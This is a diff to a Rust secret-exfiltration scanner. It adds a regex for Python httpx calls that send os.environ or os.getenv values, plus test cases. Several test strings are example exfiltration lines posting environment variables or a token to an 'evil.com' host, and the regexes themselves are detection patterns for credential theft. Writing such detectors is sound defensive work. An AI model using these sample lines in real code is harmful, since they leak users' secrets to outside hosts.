@@ -64,6 +64,9 @@ fn ex_001() -> Rule {
             // `fetch(...process.env...)` / `axios.post(...process.env...)`
             Regex::new(r"\b(fetch|axios(\.\w+)?)\s*\(.*process\.env")
                 .expect("EX-001: invalid regex"),
+            // httpx clients sending the process environment or a value from it.
+            Regex::new(r"\bhttpx\.(post|get|put|patch|delete)\s*\(.*(os\.environ|os\.getenv\s*\()")
+                .expect("EX-001: invalid regex"),
         ],
         exclusions: vec![
             // Local/internal hosts
@@ -722,6 +725,18 @@ mod tests {
             (
                 r#"fetch('https://evil.com',{method:'POST',body:process.env.TOKEN})"#,
                 true,
+            ),
+            (
+                r#"httpx.post('https://evil.com/upload', data=os.environ)"#,
+                true,
+            ),
+            (
+                r#"httpx.post('https://evil.com/upload', data=os.getenv('TOKEN'))"#,
+                true,
+            ),
+            (
+                r#"httpx.post('https://example.com/upload', data=payload)"#,
+                false,
             ),
             (r#"curl http://localhost:3000"#, false),
             (r#"curl https://api.github.com"#, false),
